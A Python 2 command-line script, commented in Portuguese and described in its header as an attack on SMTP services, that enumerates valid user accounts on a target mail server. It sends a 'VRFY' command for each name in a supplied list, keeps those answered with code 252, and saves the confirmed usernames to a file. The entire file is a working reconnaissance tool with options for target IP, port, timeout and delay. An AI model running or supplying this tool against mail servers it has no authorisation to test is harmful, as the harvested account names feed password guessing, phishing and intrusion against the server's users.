#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo faz o ataques de serviços de
  SMTP na porta 25

  Modificado em 12 de dezembro de 2016
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importando as bibliotecas necessárias
import socket, time, argparse, os, sys

# Função que faz a leitura dos arquivos
def read_file(filename):
    with open(filename) as file:
        lines = file.read().splitlines()
    return lines

# Função que faz a verificação do seviço SMTP na porta 25
def verify_smtp(verbose, filename, ip, timeout_value, sleep_value, port=25):
    if port is None:
        port=int(25)
    elif port is "":
        port=int(25)
    else:
        port=int(port)
    if verbose > 0:
        print "[*] Conectando ao IP %s na porta %s para executar o teste" % (ip, port)
    valid_users=[]
    username_list = read_file(filename)
    for user in username_list:
        try:
            sys.stdout.flush()
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout_value)
            connect=s.connect((ip,port))
            banner=s.recv(1024)
            if verbose > 0:
                print("[*] O banner do sistema é: '%s'") % (str(banner))
            command='VRFY ' + user + '\n'
            if verbose > 0:
                print("[*] Executando: %s") % (command)
                print("[*] Entrada de teste %s de %s") % (str(username_list.index(user)),str( len(username_list)))
            s.send(command)
            result=s.recv(1024)
            if "252" in result:
                valid_users.append(user)
                if verbose > 1:
                    print("[+] O nome de usuário %s é válido") % (user)
            if "550" in result:
                if verbose > 1:
                    print "[-] 550 Usuário não existe"
            if "503" in result:
                print("[!] O servidor requer autenticação")
                break
            if "500" in result:
                print("[!] O comando VRFY não é suportado")
                break
        except IOError as e:
            if verbose > 1:
                print("[!] Ocorreu o seguinte erro: '%s'") % (str(e))
            if 'Operação em andamento' in e:
                print("[!] A conexão com o SMTP falhou")
                break
        finally:
            if valid_users and verbose > 0:
                print("[+] %d Usuário(s) são válidos" % (len(valid_users)))
            elif verbose > 0 and not valid_users:
                print("[!] Não foram encontrados usuários válidos")
            s.close()
            if sleep_value is not 0:
                time.sleep(sleep_value)
            sys.stdout.flush()
    return valid_users

# Função que escreve os nomes dos usuários
def write_username_file(username_list, filename, verbose):
    open(filename, 'w').close() # Excluir o conteúdo do nome do arquivo
    if verbose > 1:
        print("[*] Escrevendo para %s") % (filename)
    with open(filename, 'w') as file:
        file.write('\n'.join(username_list))
    return

if __name__ == '__main__':
    # Se o script for executado no CLI
    usage = '''modo de usar: %(prog)s [-u username_file] [-f output_filename] [-i ip address] [-p port_number] [-t timeout] [-s sleep] -q -v -vv -vvv'''
    parser = argparse.ArgumentParser(usage=usage)
    parser.add_argument("-u", "--usernames", type=str, help="Os nomes de usuários que devem ser lidos", dest="username_file")
    parser.add_argument("-f", "--filename", type=str, help="Nome de arquivo para a saída dos nomes de usuário confirmados", action="store", dest="filename")
    parser.add_argument("-i", "--ip", type=str, help="O endereço IP do sistema de destino", action="store", dest="ip")
    parser.add_argument("-p","--port", type=int, default=25, action="store", help="A porta do serviço SMTP do sistema de destino", dest="port")
    parser.add_argument("-t","--timeout", type=float, default=1, action="store", help="O valor de tempo limite para respostas de serviço em segundos", dest="timeout_value")
    parser.add_argument("-s","--sleep", type=float, default=0.0, action="store", help="O tempo de espera entre cada pedido em segundos", dest="sleep_value")
    parser.add_argument("-v", action="count", dest="verbose", default=1, help="Nível de verbosidade, padrão para um, este produz cada comando e resultado")
    parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Define os resultados como silenciosos")
    parser.add_argument('--version', action='version', version='%(prog)s 0.42b')
    args = parser.parse_args()

    # Definir Construtores
    username_file = args.username_file   # Nomes de usuário a serem testados
    filename = args.filename             # Nome do arquivo para saídas
    verbose = args.verbose               # Nível de Verbosidade
    ip = args.ip                         # Endereço IP para testar
    port = args.port                     # Porta para o serviço testar
    timeout_value = args.timeout_value   # Valor de tempo limite para conexões de serviço
    sleep_value = args.sleep_value       # Valor de suspensão entre solicitações
    dir = os.getcwd()                    # Obter diretório de trabalho atual
    username_list =[]

    # Argumento Validador
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    if not filename:
        if os.name != "nt":
            filename = dir + "/confirmed_username_list"
        else:
             filename = dir + "\\confirmed_username_list"
    else:
        if filename:
            if "\\" or "/" in filename:
                if verbose > 1:
                    print("[*] Usando o nome do arquivo: %s") % (filename)
        else:
            if os.name != "nt":
                filename = dir + "/" + filename
            else:
                filename = dir + "\\" + filename
                if verbose > 1:
                    print("[*] Usando o nome do arquivo: %s") % (filename)

username_list = verify_smtp(verbose, username_file, ip, timeout_value, sleep_value, port)
if len(username_list) > 0:
    write_username_file(username_list, filename, verbose)








